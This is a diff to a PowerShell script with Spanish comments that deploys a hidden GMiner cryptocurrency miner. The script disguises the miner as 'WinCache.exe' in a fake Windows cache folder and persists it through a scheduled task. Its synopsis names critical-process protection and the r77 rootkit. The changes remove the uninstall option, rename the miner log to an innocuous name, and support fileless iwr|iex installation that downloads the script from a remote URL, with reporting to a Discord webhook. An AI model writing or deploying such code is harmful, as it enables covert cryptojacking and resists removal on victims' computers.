@@ -3,6 +3,7 @@
 .SYNOPSIS
     Deploys and runs GMiner from a hidden system folder using Task Scheduler.
     Includes Safe Update, Critical Process (with Safe Shutdown), and r77 Rootkit.
+    NOTE: This version DOES NOT include the -Uninstall switch.
 .EXAMPLE
     .\Mine.ps1 -Wallet "YOUR_WALLET_ADDRESS" -Pool "us-rvn.2miners.com:6060" -Algo "kawpow" -DiscordWebhook "https://discord.com/api/webhooks/..."
 #>
@@ -13,7 +14,6 @@ param(
     [string]$Algo,
     [string]$Worker,
     [string]$DiscordWebhook,
-    [switch]$Uninstall,
     [switch]$Foreground,
     [switch]$TestWebhook,
     [switch]$Diagnose,
@@ -28,7 +28,7 @@ $Root      = Join-Path $env:ProgramData 'Microsoft\Windows\Caches\WinCache'
 $LogDir    = Join-Path $Root 'logs'
 $ExePath   = Join-Path $Root 'WinCache.exe'
 $SelfPs    = Join-Path $Root 'WinCache.ps1'
-$LogFile   = Join-Path $LogDir 'miner.log'
+$LogFile   = Join-Path $LogDir 'cache.log'
 $TaskName  = 'WinCacheAgent'
 
 $scriptPath = $PSCommandPath
@@ -92,6 +92,18 @@ function Send-DiscordWebhook {
     } catch { return $false }
 }
 
+function Stop-Safe {
+    Write-Host '[*] Deteniendo instancia anterior de forma segura...'
+    $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
+        Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
+    foreach ($w in $watchers) {
+        [ProcessProtector]::SetCriticalForPid($w.ProcessId, $false)
+        Stop-Process -Id $w.ProcessId -Force -ErrorAction SilentlyContinue
+    }
+    Start-Sleep -Seconds 1
+    Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+}
+
 # ---------- test webhook ----------------------------------------------------
 if ($TestWebhook) {
     if (-not $DiscordWebhook) { throw '-TestWebhook requiere -DiscordWebhook <url>' }
@@ -111,6 +123,7 @@ if ($Diagnose) {
     Line 'Exists'      (Test-Path $Root)
     Line 'WinCache.exe'(Test-Path $ExePath)
     Line 'WinCache.ps1'(Test-Path $SelfPs)
+    Line 'cache.log'   $LogFile
 
     Section 'Scheduled Task'
     $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
@@ -120,7 +133,7 @@ if ($Diagnose) {
     $miners = Get-Process WinCache -ErrorAction SilentlyContinue
     if ($miners) { foreach ($m in $miners) { Line "Miner PID $($m.Id)" "started=$($m.StartTime)" } } else { Write-Host '  Miner NO corriendo.' -ForegroundColor Yellow }
 
-    Section 'Last 10 lines of miner.log'
+    Section 'Last 10 lines of cache.log'
     if (Test-Path $LogFile) { Get-Content $LogFile -Tail 10 | ForEach-Object { Write-Host "  $_" } } else { Write-Host '  (No existe)' }
     Write-Host ''
     return
@@ -259,16 +272,13 @@ if ([string]::IsNullOrWhiteSpace($Worker)) {
 
 # ---------- install self (Soporte para iwr | iex) ---------------------------
 if ($scriptPath -and (Test-Path $scriptPath) -and ($scriptPath -ne $SelfPs)) {
-    # Ejecución tradicional en disco
     Copy-Item $scriptPath $SelfPs -Force
     Unblock-File $SelfPs -ErrorAction SilentlyContinue
 } elseif (-not $scriptPath -or -not (Test-Path $scriptPath)) {
-    # Ejecución vía iwr | iex (en memoria). Descargamos el script a disco.
     Write-Host '[*] Ejecución en memoria detectada. Guardando copia local...'
     Invoke-WebRequest -Uri $RemoteUrl -OutFile $SelfPs -UseBasicParsing
 }
 
-# Validación
 $head = (Get-Content $SelfPs -TotalCount 1 -ErrorAction SilentlyContinue)
 if ($head -notmatch '^#Requires') { Remove-Item $SelfPs -Force; throw "Archivo descargado no es válido." }
 
